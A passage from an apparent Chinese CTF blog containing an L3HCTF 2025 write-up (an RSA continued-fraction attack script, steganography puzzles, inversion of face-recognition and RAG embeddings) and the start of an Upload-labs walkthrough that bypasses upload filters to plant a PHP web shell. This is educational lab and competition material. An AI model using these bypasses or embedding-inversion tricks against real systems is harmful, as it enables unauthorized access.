N,k&lt;d,d&lt;\frac{1}{3}N^{\frac{1}{4}}$<br>$\therefore |\frac{e}{N}-\frac{k}{d}|&#x3D;|\frac{1-ks}{dN}|&lt;|\frac{ks}{dN}|&lt;|\frac{s}{N}|&lt;\frac{3}{\sqrt N}&lt;\frac{1}{3d^2}&lt;\frac{1}{2d^2}$<br>$\therefore \frac{k}{d}是\frac{e}{N}的收敛子$<br><strong>参考：</strong><a href="https://cot287.github.io/2024/12/22/Crypto/RSA/%E5%B0%8F%E8%A7%A3%E5%AF%86%E6%8C%87%E6%95%B0/wiener%20attack/wiener%20attack/">wiener attack | Cot287’s Blog</a><br><strong>结合本题：</strong><br>本题中有，$2^{1020}\leq d_{small} &lt;2^{1021}，虽然N为1024位，$但结合上边的分析可知，我们使用的不一定是$N$，而是与$\phi(N)$相近的一个已知的数。且上边的$d$也不一定是$d$，只要是能够满足勒让德定理的一个关键的数即可，而这里$d&#x3D;phi - d_{small}$，因此需要通过推导，让这里的$d_{small}$占据之前$d$的位置<br>$\because \phi(N)&#x3D;(p^4-1)(q^4-1)$<br>$\therefore 这里使用N_4 &#x3D; N^4&#x3D;p^4q^4$<br>$\because ed &#x3D;k\phi(N)+1$<br>$\therefore e(\phi(N)-d_{small})&#x3D;k\phi(N)+1$<br>$\therefore ed_{small} &#x3D; k\phi(N)-1$<br>$\therefore 求\frac{e}{N_4}$的连分数便能求得$\phi(N)$和$d$，之后便能够利用求得的$d$在简单的环上$RSA$解密<br><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">c_poly, N, d</span>):<br>    R = Integers(N)<br>    P = PolynomialRing(R, <span class="hljs-string">&#x27;t&#x27;</span>)<br>    t = P.gen()<br>    Q = P.quotient(t**<span class="hljs-number">4</span> - <span class="hljs-number">2</span>)<br><br>    c = Q(c_poly)<br>    m_poly = c ** d<br>    <span class="hljs-keyword">return</span> m_poly.lift()[<span class="hljs-number">0</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack_d</span>(<span class="hljs-params">N, e, c</span>):<br>    N = Integer(N)<br>    e = Integer(e)<br>    N4 = N ^ <span class="hljs-number">4</span><br>    cf = (e / N4).continued_fraction().convergents()<br><br>    <span class="hljs-keyword">for</span> conv <span class="hljs-keyword">in</span> cf:<br>        k = conv.numerator()<br>        d_small = conv.denominator()<br><br>        <span class="hljs-keyword">if</span> d_small &lt; <span class="hljs-number">2</span>^<span class="hljs-number">1020</span> <span class="hljs-keyword">or</span> d_small &gt;= <span class="hljs-number">2</span>^<span class="hljs-number">1021</span>:<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> (e * d_small + <span class="hljs-number">1</span>) % k != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">continue</span><br>        phi_candidate = (e * d_small + <span class="hljs-number">1</span>) // k<br>        <span class="hljs-comment">#print(&quot;phi=&quot;,phi_candidate)</span><br>        d = phi_candidate - d_small<br>        <span class="hljs-keyword">return</span> d<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to find d&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br><br>N = <span class="hljs-number">99697845285265879829811232968100099666254250525000506525475952592468738395250956460890611762459685140661035795964867321445992110528627232335703962897072608767840783176553829502743629914407970206513639916759403399986924602596286330464348286080258986075962271511105387188070309852907253486162504945490429185609</span><br>e = <span class="hljs-number">74900336437853271512557457581304251523854378376434438153117909482138661618901386551154807447783262736408028580620771857416463085746907317126876189023636958838207330193074215769008709076254356539808209005917645822989554532710565445155350102802675594603406077862472881027575871589046600011223990947361848608637247276816477996863812313225929441545045479384803449990623969591150979899801722841101938868710054151839628803383603849632857020369527380816687165487370957857737696187061619496102857237814447790678611448197153594917852504509869007597997670022501500067854210261136878917620198551551460145853528269270832725348151160651020188255399136483482428499340574623409209151124687319668989144444549871527949104436734300277004316939985015286758651969045396343970037328043635061226100170529991733947365830164811844853806681198818875837903563263114249814483901121700854712406832325690101810786429930813776784979083590353027191492894890551838308899148551566437532914838098811643805243593419063566975400775134981190248113477610235165151367913498299241375039256652674679958159505112725441797566678743542054295794919839551675786573113798857814005058856054462008797386322048089657472710775620574463924678367455233801970310210504653908307254926827</span><br>c = <span class="hljs-number">98460941530646528059934657633016619266170844887697553075379408285596784682803952762901219607460711533547279478564732097775812539176991062440097573591978613933775149262760936643842229597070673855940231912579258721734434631479496590694499265794576610924303262676255858387586947276246725949970866534023718638879</span><br><br>d = attack_d(N, e, c)<br>ans = long_to_bytes(<span class="hljs-built_in">int</span>(decrypt(c,N,d)))<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="量子双生影"><a href="#量子双生影" class="headerlink" title="量子双生影"></a>量子双生影</h2><p><strong>分析：</strong><br>本题中给了一个<code>stream2.rar</code>压缩包，查看二进制数据，发现压缩包中存在两个文件，然而直接解压只能够解压出一个图片文件。<br><img src="/2025/07/20/L3HCTF%202025%20WriteUp/stream2.webp"><br>扫码可以得到一个提示：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">flag <span class="hljs-literal">is</span><span class="hljs-built_in"> not</span> here, but I can give you the<span class="hljs-built_in"> key</span>: <span class="hljs-string">&quot;quantum&quot;</span><br></code></pre></td></tr></table></figure><p>存在需要密码的隐写，由于还有一个文件没有解压出来，猜测是另一个文件的隐写密码为<code>quantum</code>。<br>那么现在需要优先得到第二个文件，分析二进制数据<br><img src="/2025/07/20/L3HCTF%202025%20WriteUp/file-20250722172835947.png"></p><p>发现第二个文件像是一种数据流形式，结合文件名也是stream，猜测可能是NTFS 备用数据流隐写（ADS）。<br>使用<code>ntfsstreamseditor</code>工具进行分离数据流<br><img src="/2025/07/20/L3HCTF%202025%20WriteUp/file-20250722173309683.png">成功导出，得到第二张图片文件<br><img src="/2025/07/20/L3HCTF%202025%20WriteUp/1.webp"><br>结合前边给出的密码，结合图片像是两张图片的融合，猜测需要先使用两张图片进行XOR，然后再使用<code>quantum</code>作为密码再次进行XOR，这里直接写一个简单脚本进行解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor_images</span>(<span class="hljs-params">path1, path2, out_path, key_str=<span class="hljs-string">&quot;quantum&quot;</span></span>):<br>    im1 = Image.<span class="hljs-built_in">open</span>(path1).convert(<span class="hljs-string">&quot;RGB&quot;</span>)<br>    im2 = Image.<span class="hljs-built_in">open</span>(path2).convert(<span class="hljs-string">&quot;RGB&quot;</span>)<br>    <span class="hljs-keyword">if</span> im1.size != im2.size:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;两张图片尺寸必须完全相同&quot;</span>)<br><br>    arr1 = np.array(im1, dtype=np.uint8)<br>    arr2 = np.array(im2, dtype=np.uint8)<br><br>    xor_arr = np.bitwise_xor(arr1, arr2)<br><br>    key_bytes = key_str.encode()<br>    flat = xor_arr.flatten()<br>    key_extended = np.resize(np.frombuffer(key_bytes, dtype=np.uint8),flat.shape)<br>    final_flat = np.bitwise_xor(flat, key_extended)<br><br>    final_arr = final_flat.reshape(xor_arr.shape)<br>    Image.fromarray(final_arr).save(out_path)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;已保存结果到 <span class="hljs-subst">&#123;out_path&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    xor_images(<span class="hljs-string">&quot;1.webp&quot;</span>, <span class="hljs-string">&quot;stream2.webp&quot;</span>, <span class="hljs-string">&quot;out.png&quot;</span>, key_str=<span class="hljs-string">&quot;quantum&quot;</span>)<br></code></pre></td></tr></table></figure><p> 第一次异或之后的结果：<br> <img src="/2025/07/20/L3HCTF%202025%20WriteUp/out%201.png"><br> 第二次异或之后的结果：<br> <img src="/2025/07/20/L3HCTF%202025%20WriteUp/out.png"><br> 扫码得到flag：<code>L3HCTF&#123;Quantum_ADS_XOR&#125;</code></p><h2 id="Please-Sign-In"><a href="#Please-Sign-In" class="headerlink" title="Please Sign In"></a>Please Sign In</h2><p> <strong>题目：</strong><br> <code>embedding.json</code>文件+<br> <code>server.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> uvicorn<br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, File, UploadFile<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">from</span> torchvision <span class="hljs-keyword">import</span> transforms<br><span class="hljs-keyword">from</span> torchvision.models <span class="hljs-keyword">import</span> shufflenet_v2_x1_0, ShuffleNet_V2_X1_0_Weights<br><br>feature_extractor = shufflenet_v2_x1_0(weights=ShuffleNet_V2_X1_0_Weights.IMAGENET1K_V1)<br>feature_extractor.fc = torch.nn.Identity()<br>feature_extractor.<span class="hljs-built_in">eval</span>()<br><br>weights = ShuffleNet_V2_X1_0_Weights.IMAGENET1K_V1<br>transform = transforms.Compose([<br>    transforms.ToTensor(),<br>])<br><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-string">&quot;embedding.json&quot;</span>):<br>    user_image = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;user_image.jpg&quot;</span>).convert(<span class="hljs-string">&quot;RGB&quot;</span>)<br>    user_image = transform(user_image).unsqueeze(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        user_embedding = feature_extractor(user_image)[<span class="hljs-number">0</span>]<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;embedding.json&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        json.dump(user_embedding.tolist(), f)<br>    <br>user_embedding = json.load(<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;embedding.json&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>))<br>user_embedding = torch.tensor(user_embedding, dtype=torch.float32)<br>user_embedding = user_embedding.unsqueeze(<span class="hljs-number">0</span>)<br>    <br>app = FastAPI()<br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/signin/&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">signin</span>(<span class="hljs-params">file: UploadFile = File(<span class="hljs-params">...</span>)</span>):<br>    submit_image = Image.<span class="hljs-built_in">open</span>(file.file).convert(<span class="hljs-string">&quot;RGB&quot;</span>)<br>    submit_image = transform(submit_image).unsqueeze(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        submit_embedding = feature_extractor(submit_image)[<span class="hljs-number">0</span>]<br>    diff = torch.mean((user_embedding - submit_embedding) ** <span class="hljs-number">2</span>)<br>    result = &#123;<br>        <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;L3HCTF&#123;test_flag&#125;&quot;</span> <span class="hljs-keyword">if</span> diff.item() &lt; <span class="hljs-number">5e-6</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;failure&quot;</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">root</span>():<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Welcome to the Face Recognition API!&quot;</span>&#125;<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    uvicorn.run(app, host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">8000</span>)<br></code></pre></td></tr></table></figure><p> <strong>分析：</strong><br> 该题目的解题思路就是利用<code>embedding.json</code>逆向生成一张图片，使两者的<code>embedding</code>向量均方差值差异小于<code>5e-6</code>。可以直接AI一个脚本，注意要将最后得到的图片保存为无损压缩的<code>png</code>图片。<br> <strong>代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torchvision.transforms <span class="hljs-keyword">as</span> transforms<br><span class="hljs-keyword">from</span> torchvision.models <span class="hljs-keyword">import</span> shufflenet_v2_x1_0, ShuffleNet_V2_X1_0_Weights<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-comment"># 加载模型和user_embedding</span><br>feature_extractor = shufflenet_v2_x1_0(weights=ShuffleNet_V2_X1_0_Weights.IMAGENET1K_V1)<br>feature_extractor.fc = torch.nn.Identity()<br>feature_extractor.<span class="hljs-built_in">eval</span>()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;embedding.json&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    user_embedding = torch.tensor(json.load(f), dtype=torch.float32)<br><br><span class="hljs-comment"># 初始化随机图片</span><br>image = torch.randn(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">224</span>, <span class="hljs-number">224</span>, requires_grad=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># 随机初始化</span><br>optimizer = torch.optim.Adam([image], lr=<span class="hljs-number">0.1</span>)<br>criterion = torch.nn.MSELoss()<br><br><span class="hljs-comment"># 优化循环</span><br><span class="hljs-keyword">for</span> step <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2000</span>):<br>    optimizer.zero_grad()<br>    generated_embedding = feature_extractor(image)[<span class="hljs-number">0</span>]<br>    loss = criterion(generated_embedding, user_embedding)<br>    loss.backward()<br>    optimizer.step()<br>    <span class="hljs-comment"># 限制像素值范围</span><br>    image.data = torch.clamp(image.data, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> step % <span class="hljs-number">100</span> == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Step <span class="hljs-subst">&#123;step&#125;</span>, Loss: <span class="hljs-subst">&#123;loss.item()&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">if</span> loss.item() &lt; <span class="hljs-number">5e-6</span>:<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># 保存生成的图片</span><br>generated_img = image.detach().squeeze(<span class="hljs-number">0</span>).permute(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>).numpy()<br>generated_img = (generated_img * <span class="hljs-number">255</span>).astype(np.uint8)<br>Image.fromarray(generated_img).save(<span class="hljs-string">&quot;generated_user_image.png&quot;</span>)<br></code></pre></td></tr></table></figure><p>接下来cmd执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -F <span class="hljs-string">&quot;file=@generated_user_image.png&quot;</span>  http://1.95.8.146:50001/signin/<br></code></pre></td></tr></table></figure><h2 id="LearnRAG"><a href="#LearnRAG" class="headerlink" title="LearnRAG"></a>LearnRAG</h2><p><strong>分析：</strong><br>RAG（检索增强生成） 是一种结合了信息检索技术与语言生成模型的人工智能技术。它将检索器和大语言模型（LLMs）结合使用，使得模型能够通过搜索库实时更新内容，可以实时查询外部知识。<br>查看文件字符串：<br><img src="/2025/07/20/L3HCTF%202025%20WriteUp/file-20250723180632528.png"><br>发现该<code>pickle</code>文件存储了以下内容：</p><ul><li>一个名为<code>RagData</code>的用户自定义类实例</li><li><code>sentence-transformers/gtr-t5-base</code>模型的嵌入向量<br>因此本题的思路便是通过嵌入向量<code>embedding</code>来反转嵌入，项目地址：<a href="https://github.com/vec2text/vec2text">GitHub - vec2text&#x2F;vec2text</a><br>稍微修改一下项目给出的脚本代码即可。<br><strong>代码：</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> vec2text<br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> AutoModel, AutoTokenizer<br><br><span class="hljs-comment">#跳过空壳类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RagData</span>: <br>    <span class="hljs-keyword">pass</span><br><br>encoder = AutoModel.from_pretrained(<span class="hljs-string">&quot;sentence-transformers/gtr-t5-base&quot;</span>).encoder.to(<span class="hljs-string">&quot;cuda&quot;</span>)<br>tokenizer = AutoTokenizer.from_pretrained(<span class="hljs-string">&quot;sentence-transformers/gtr-t5-base&quot;</span>)<br>corrector = vec2text.load_pretrained_corrector(<span class="hljs-string">&quot;gtr-base&quot;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rag_data.pkl&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    obj = pickle.load(f)<br>embeddings = torch.tensor(obj.embeddings, dtype=torch.float32)<br><br><br>texts = vec2text.invert_embeddings(<br>    embeddings=embeddings.cuda(),<br>    corrector=corrector,<br>    num_steps=<span class="hljs-number">20</span>,<br>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> texts:<br>    <span class="hljs-built_in">print</span>(i.strip())<br></code></pre></td></tr></table></figure><p><img src="/2025/07/20/L3HCTF%202025%20WriteUp/file-20250723202738578.png"></p><h2 id="PaperBack"><a href="#PaperBack" class="headerlink" title="PaperBack"></a>PaperBack</h2><p>根据题目提供的线索进行搜索，可以找到一款OllyDbg开发的名为PaperBack的工具，它能够将文件以超大位图的形式备份到普通纸张上。<br>工具：<a href="https://ollydbg.de/Paperbak/">PaperBack</a><br>使用工具的Open Bitmap功能可以得到<code>flag.ws</code>文件，观察文件后缀和文件内容，推断应该是Whitespace代码，直接在线工具运行即可得到flag。<br><img src="/2025/07/20/L3HCTF%202025%20WriteUp/file-20250723221837157.png"></p><h2 id="Why-not-read-it-out"><a href="#Why-not-read-it-out" class="headerlink" title="Why not read it out"></a>Why not read it out</h2><p>先查看文件二进制数据，发现文件末尾像是base64<br><img src="/2025/07/20/L3HCTF%202025%20WriteUp/file-20250723222748335.png"><br>尝试之后，发现是base64逆序，解码之后得到提示<code>IGN Review</code><br><img src="/2025/07/20/L3HCTF%202025%20WriteUp/file-20250723222704644.png"><br>同时观察到该文件是jpg文件，将后缀名改为<code>.jpg</code><br><img src="/2025/07/20/L3HCTF%202025%20WriteUp/README.jpg"><br>有点没看懂，谷歌识图一下，发现是一款游戏<code>Trunic</code>中的语言，结合前面得到的提示，搜索<code>IGN review Trunic</code><br><img src="/2025/07/20/L3HCTF%202025%20WriteUp/file-20250723224419514.png"><br>前往<code>IGN Review</code>： <a href="https://www.ign.com/articles/tunic-review-xbox-pc-steam">https://www.ign.com/articles/tunic-review-xbox-pc-steam</a> 查看之后，发现前两段跟图片中的密文类似，因此便可以一个一个对照得到对照表，从而解出后五句关键密文。<br><img src="/2025/07/20/L3HCTF%202025%20WriteUp/file-20250723225231687.png"><br>解出的明文如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">1. The content of flag is: come on little brave fox.<br>2. Replace letter O with number 0, letter L with number 1.<br>3. Replace letter A with symbol at(@).<br>4. Make every letter E uppercase.<br>5. Use underline to link each word.<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>L3HCTF</tag>
      
      <tag>XCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Uploads-labs通关笔记（1-10）</title>
    <link href="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/"/>
    <url>/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h4 id="（1）Pass-01"><a href="#（1）Pass-01" class="headerlink" title="（1）Pass-01"></a>（1）<strong>Pass-01</strong></h4><p>先尝试上传一句话木马php文件进行抓包，发现直接返回文件类型错误，且抓包失败，结合源码分析，应该是文件类型在前端便进行了验证<br> <br><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092136817.png"></p><p>因此我们可以先修改木马文件的后缀名，然后成功抓包</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092200319.png"></p><p>右键发送到repeater中send，然后查找文件上传路径</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092219427.png"> </p><p>然后提交查看结果</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092232128.png"> </p><p>使用蚁剑测试连接</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092242310.png"> </p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092257953.png"></p><h4 id="（2）Pass-02"><a href="#（2）Pass-02" class="headerlink" title="（2）Pass-02"></a>（2）<strong>Pass-02</strong></h4><p>先直接上传php发现返回错误信息</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092326693.png"></p><p>提示文件类型错误，接下来进行bp抓包，结合源码分析，并修改文件类型为image&#x2F;jpeg</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092340066.png"> </p><p>右键发送给repeater，尝试进行上传，并查找上传路径</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092354522.png"></p><p>使用蚁剑成功连接</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092404430.png"></p><p>成功使用蚁剑getshell</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092422402.png"></p><h4 id="（3）Pass-03"><a href="#（3）Pass-03" class="headerlink" title="（3）Pass-03"></a>（3）<strong>Pass-03</strong></h4><p>尝试直接上传php文件</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092434464.png"> </p><p>分析源码</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092444754.png"></p><p>抓包，将文件后缀名改为.phtml</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092452599.png"></p><p>发送到repeater，send之后搜索找到上传的文件路径和修改过的文件名</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092512904.png"><br><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092524762.png"></p><p>成功使用蚁剑getshell</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092535878.png"></p><h4 id="（4）Pass-04"><a href="#（4）Pass-04" class="headerlink" title="（4）Pass-04"></a>（4）<strong>Pass-04</strong></h4><p>查看源代码</p><p><img 